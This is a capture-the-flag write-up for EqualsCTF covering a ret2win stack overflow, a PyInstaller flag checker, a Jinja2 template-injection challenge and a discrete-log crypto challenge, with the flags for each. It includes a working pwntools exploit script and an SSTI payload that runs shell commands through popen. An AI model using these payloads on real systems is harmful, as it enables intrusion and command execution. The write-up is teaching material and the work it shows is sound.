---
title: EqualsCTF
date: 2026-06-20
categories: [EqualsCTF, Write-up]
tags: [write-up, pwn, reverse-engineering, web, crypto]
author: Mohamad Helmi
description: "EqualsCTF challenges write-up"
---
# Intro
Come for the vibe and jalan-jalan at APU🙂

## dogwalker (Pwn)
The binary `dogwalker` is a 64-bit PIE ELF, reachable via `nc 135.181.88.229 20003`.

### Enumeration
```
$ file dogwalker
dogwalker: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped

$ checksec dogwalker
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
```

Protections active:
- **PIE** — base address randomized on every run (ASLR)
- **NX** — stack is not executable
- **No stack canary** — a buffer overflow can directly overwrite the return address

Disassembly reveals 4 key functions (offset from base):

| Function | Offset | Description |
|---|---|---|
| `win()` | `0x11a9` | Opens `flag.txt`, prints the flag |
| `bark()` | `0x12e1` | Prints "woof woof!" |
| `groom()` | `0x12f7` | **VULNERABLE** — buffer overflow |
| `main()` | `0x1345` | Prints the PIE leak, routes to the menu |

### Analysis
**PIE Leak (ASLR Bypass).** `main()` prints the address of `bark()` directly:

```c
printf("whistle: %p\n", &bark);
```

Sample output:
```
whistle: 0x608440c142e1
```

The binary's base address can be computed:
```python
base = leaked_bark_addr - 0x12e1
```

**Buffer Overflow in `groom()`.**

```c
// groom() — stack layout:
// rbp-0x50  = buffer (80 bytes)
// rbp+0x00  = saved rbp (8 bytes)
// rbp+0x08  = return address

read(0, rbp-0x50, 0xc8);  // reads 200 bytes into an 80-byte buffer!
```

Overflow: **200 - 80 = 120 bytes** can write past the buffer. The return address sits at **offset 88** from the start of the buffer (`0x50 + 0x8`).

### Exploitation
Attack strategy:

1. Receive the `whistle: <addr>` output → compute `base`
2. Send `'1'` → enter `groom()`
3. Send the overflow payload: `[ 'A' * 88 ] [ ret gadget ] [ win() address ]`

The `ret` gadget is needed for **16-byte stack alignment** before `win()` is called (an SSE requirement on x86-64). Found at offset `0x1016` via `objdump`:
```
1016: c3   ret
```

```python
from pwn import *

BINARY = "./dogwalker"
HOST, PORT = "135.181.88.229", 20003

elf = ELF(BINARY)
context.binary = elf

io = remote(HOST, PORT)

# Step 1: Receive the PIE leak
io.recvuntil(b"whistle: ")
leak = int(io.recvline().strip(), 16)
base = leak - 0x12e1
log.info(f"base: {hex(base)}")

win_addr   = base + 0x11a9
ret_gadget = base + 0x1016

# Step 2: Pick menu option '1' → groom()
io.recvuntil(b"2) Bark and leave\n")
io.sendline(b"1")

# Step 3: Send the overflow payload
io.recvuntil(b"Collar name:")
payload  = b"A" * 88          # padding
payload += p64(ret_gadget)    # stack alignment
payload += p64(win_addr)      # jump to win()
io.send(payload)

output = io.recvall(timeout=5)
print(output.decode())
io.close()
```

Output:
```
Good dog! Here is your treat: EQCTF{1_4M_Pwn_M4sT3r_w0oF_wo0f}
```

### Flag
```
EQCTF{1_4M_Pwn_M4sT3r_w0oF_wo0f}
```

### Key Takeaways
Without a stack canary, a single PIE leak is all it takes to compute every address needed for a ret2win. Also worth remembering: 16-byte stack alignment matters when the target function uses SSE instructions — get it wrong and `win()` crashes before you even see the output.

---

## doggy (Reverse Engineering)
The binary `doggy-flag-checker` is a stripped 64-bit ELF.

### Enumeration
```
$ file doggy-flag-checker
doggy-flag-checker: ELF 64-bit LSB executable, x86-64, dynamically linked, stripped

$ ls -lh doggy-flag-checker
-rwxrwxr-x 1 kali kali 8.6M Jun 20 ...
```

8.6 MB is unusually large for a simple binary. `strings` reveals:

```
PyRun_SimpleStringFlags
_MEIPASS
pyi-python-flag
libpython3.10.so.1.0
```

**Conclusion: this binary is a PyInstaller bundle** — a Python 3.10 script compiled and packed into a single ELF executable. The real logic lives in the embedded Python bytecode.

### Analysis
**Step 1: Extract the PyInstaller bundle**

```bash
python3 pyinstxtractor.py doggy-flag-checker
```

Output:
```
[+] Processing doggy-flag-checker
[+] Pyinstaller version: 2.1+
[+] Python version: 3.10
[+] Length of package: 8,567,890 bytes
[+] Found 12 files in CArchive
[+] Beginning extraction...
[+] Possible entry point: challenge.pyc
```

Entry point: `challenge.pyc`

**Step 2: Decompile the bytecode**

The host Python (3.13) can't load Python 3.10 bytecode directly. Use `xdis` inside a virtualenv:

```bash
python3 -m venv /tmp/venv310
source /tmp/venv310/bin/activate
pip install xdis

# Run from /tmp to avoid conflicting with the extracted struct.pyc
python3 -c "
import xdis
import marshal, sys
sys.path.insert(0, '/tmp')
with open('/path/to/challenge.pyc', 'rb') as f:
    f.read(16)  # skip magic + timestamp + size
    code = marshal.loads(f.read())
print(code.co_consts)
print(code.co_names)
"
```

**Step 3: Reverse the validation logic**

From the bytecode, the flag check turns out to be:

```python
_k = (137, 64, 129, 97, ...)    # XOR key (4 bytes, cycling)
_p = (26, 32, 18, 17, ...)      # permutation array (34 elements)
_t = (162, 127, 177, 9, ...)    # target bytes (34 elements)

def check_flag(flag):
    if len(flag) != 34:
        return False
    shuffled = [flag[i] for i in _p]
    xored = [ord(c) ^ _k[j % 4] for j, c in enumerate(shuffled)]
    return xored == list(_t)
```

### Exploitation
To invert the above:

1. `_p` is a permutation of `0..33` → it has a unique inverse
2. For each position `j`: `shuffled[j] = chr(_t[j] ^ _k[j % 4])`
3. Then: `flag[_p[j]] = shuffled[j]`

```python
_k = (137, 64, 129, 97)          # XOR key
_p = [26, 32, 18, 17, ...]       # permutation (34 elements)
_t = [162, 127, 177, 9, ...]     # target (34 elements)

flag = ['?'] * 34
for j in range(34):
    char = chr(_t[j] ^ _k[j % 4])
    flag[_p[j]] = char

print(''.join(flag))
```

Verification:
```bash
$ echo 'EQCTF{+his_is_py+h0n_3x3cu+4bl3??}' | ./doggy-flag-checker
flag: correct!
```

> The `+` in the flag is leetspeak for the letter `t` (as in "this", "python", and "executable")

### Flag
```
EQCTF{+his_is_py+h0n_3x3cu+4bl3??}
```

### Key Takeaways
An unusually large binary (8.6 MB for a single flag checker) is a strong signal of a PyInstaller bundle. Once extracted, the validation logic in the bytecode can be analyzed directly without ever touching raw x86 disassembly — trying to reverse the `_start` C wrapper stub is a waste of time, since the real logic lives in the `.pyc`.

---

## Web badge generator (Server-Side Template Injection)
Target: `http://f760369e-d944-46a0-a644-95ff400249da.chal.1v1.eqctf.com/`, stack is Python 3.12 + Flask + Jinja2.

### Enumeration
Source code was provided in the `dist/` directory. Main file: `app.py`. The `/generate` route accepts three POST form fields: `name` (max 120 chars), `department`, `employee_id`.

The vulnerable code:

```python
@app.route("/generate", methods=["POST"])
def generate():
    name = request.form.get("name", "").strip()
    department = request.form.get("department", "Web").strip() or "Web"
    employee_id = request.form.get("employee_id", "").strip()

    # Vulnerable: user input is interpolated directly into the template string
    badge_template = f"""
    <div class="badge-card">
        ...
        <h2 class="badge-name">{name}</h2>
        <p class="badge-dept">{department}</p>
        <p class="badge-meta">Competitor ID: {employee_id or "Pending"}</p>
        ...
    </div>
    """

    badge_html = app.jinja_env.from_string(badge_template).render()  # ← SSTI!
```

### Analysis
The root cause: user input is dropped straight into a Python f-string, and that string is then handed to `jinja_env.from_string().render()` to be rendered as a Jinja2 template.

That means any input containing Jinja2 syntax like `{{ ... }}` gets **executed by the template engine** on the server.

Data flow:
```
user input → f-string interpolation → Jinja2 from_string() → render() → RCE
```

The `department` and `employee_id` fields have no length limit, making them ideal targets for a longer payload.

### Exploitation
Jinja2 SSTI grants access to the Python object hierarchy. Payload to execute an OS command:

```
{{config.__class__.__init__.__globals__['os'].popen('cat /app/flag.txt').read()}}
```

Payload breakdown:
1. `config` — a Flask config object already present in the Jinja2 context
2. `.__class__.__init__.__globals__` — reaches the Python global namespace through the object hierarchy
3. `['os']` — grabs the `os` module from that namespace
4. `.popen('cat /app/flag.txt').read()` — runs the shell command and reads the output

The payload is sent through the `department` field:

```bash
curl -X POST "http://<target>/generate" \
  --data-urlencode "name=test" \
  --data-urlencode "department={{config.__class__.__init__.__globals__['os'].popen('cat /app/flag.txt').read()}}" \
  --data-urlencode "employee_id=1"
```

The server renders the payload as a Jinja2 expression and the flag comes straight back in the HTML badge:

```html
<p class="badge-dept">EQCTF{SST1_1s_F0r_Th3_We4kl1ngs_GG3z}</p>
```

### Flag
```
EQCTF{SST1_1s_F0r_Th3_We4kl1ngs_GG3z}
```

### Key Takeaways
Never build a template string with an f-string containing user input before handing it to `jinja_env.from_string()`. The correct fix is `render_template()` with separate context variables:

```python
# SAFE — use a template file with context variables
return render_template("badge.html", name=name, department=department)
```

If a dynamic template is genuinely needed, sanitize/escape the input first, and never interpolate raw user input into a string that will later be rendered by the template engine.

---

## QR (Crypto)
Files provided: `challenge.py`, `encrypted_flag.dat` (51 bytes).

### Enumeration
The source `challenge.py` reveals a custom cipher with the following parameters:

```python
P  = 0x964b061f035604101d58d216b74546699   # ~129-bit prime modulus
g  = 101                                    # base for discrete exponentiation
a  = 0xb56a3be5dba5d16f78ce1db74cf535f0
b  = 0xd18594a9023bced7e42a4694620a253a
c  = 0x913edcf2828cca16c93ecc87215995a0
IV = 0xc6ed7e913d0bfac20fe6d01607871b8c
# d <= 500  ← the only unknown parameter
```

The encryption process for each block:

```python
prev_c = IV
for i in range(0, len(payload), 16):
    block        = bytes_to_long(payload[i:i+16])
    cbc_mask     = prev_c & ((1 << 128) - 1)
    chained_block = block ^ cbc_mask                        # CBC chaining
    core         = pow(g, chained_block, P)                 # exponentiation mod P
    mask         = (a*i**3 + b*i**2 + c*i + d) % P          # polynomial mask
    C            = (core + mask) % P
    fw.write(long_to_bytes(C, 17))
    prev_c = C
```

`encrypted_flag.dat` is **3 blocks × 17 bytes = 51 bytes** total, meaning 48 bytes of plaintext.

### Analysis
Two weaknesses stand out:

**1. Parameter `d` is very small (`d <= 500`)** — only 501 possible values, which makes brute-forcing it feasible.

**2. `P-1` is B-smooth (largest prime factor = 67)** — factoring `P-1` reveals it's made up entirely of small factors:

```
P - 1 = 2^k * 3^j * 5^i * ... * 67^m   (all prime factors ≤ 67)
```

That means **Pohlig-Hellman** can solve the discrete logarithm in the group Zp* almost instantly, even though P is 129 bits.

### Exploitation
**Step 1: Factor P-1**

```python
from sympy import factorint
P = 0x964b061f035604101d58d216b74546699
print(factorint(P - 1))
# → all prime factors ≤ 67 (B-smooth)
```

**Step 2: Brute-force `d` (0 through 500)**

```python
from sympy.ntheory.residue_ntheory import discrete_log
from Crypto.Util.number import long_to_bytes

with open('encrypted_flag.dat', 'rb') as f:
    ct = f.read()

blocks_c = [int.from_bytes(ct[i*17:(i+1)*17], 'big') for i in range(3)]

for d in range(501):
    mask0 = d % P  # index=0, so a*0 + b*0 + c*0 + d = d
    core0 = (blocks_c[0] - mask0) % P
    try:
        chained0 = discrete_log(P, core0, g)  # Pohlig-Hellman auto
    except:
        continue
    block0 = chained0 ^ (IV & ((1 << 128) - 1))
    plaintext0 = long_to_bytes(block0)
    if all(32 <= b < 127 for b in plaintext0):
        print(f"d = {d}, block0 = {plaintext0}")
        break
```

Result: **d = 321**, block 0 = `fQxBSXTMmFXvu0Tg` (a 16-byte random prefix — not the literal `<somedata>`).

**Step 3: Decrypt all blocks**

```python
d = 321
prev_c = IV
plaintext = b""

for i, C in enumerate(blocks_c):
    mask = (a * i**3 + b * i**2 + c * i + d) % P
    core = (C - mask) % P
    chained = discrete_log(P, core, g)
    cbc_mask = prev_c & ((1 << 128) - 1)
    block = chained ^ cbc_mask
    plaintext += long_to_bytes(block, 16)
    prev_c = C

print(plaintext.rstrip(b'\x00'))
```

Output:
```
b'fQxBSXTMmFXvu0TgEQCTF{t4rp1t_qr_c0d3_m4dn3ss}\x00\x00'
```

Full plaintext:
- **16-byte random prefix**: `fQxBSXTMmFXvu0Tg` (this is what's disguised as `<somedata>` in the comment)
- **Flag**: `EQCTF{t4rp1t_qr_c0d3_m4dn3ss}`
- **Padding**: null bytes

> **Note:** the `b"<somedata>"` in the source comment is just a placeholder — the real prefix is 16 random bytes, not that literal string. It's a decoy meant to block a simple known-plaintext attack.

### Flag
```
EQCTF{t4rp1t_qr_c0d3_m4dn3ss}
```

### Key Takeaways
A 129-bit modulus looks safe on the surface, but if `P-1` factors into small pieces (B-smooth), Pohlig-Hellman solves the discrete log quickly regardless of how big P is. The artificially small `d` (`<= 500`) adds a second hole that's trivially brute-forceable once the DLP is solved for each candidate.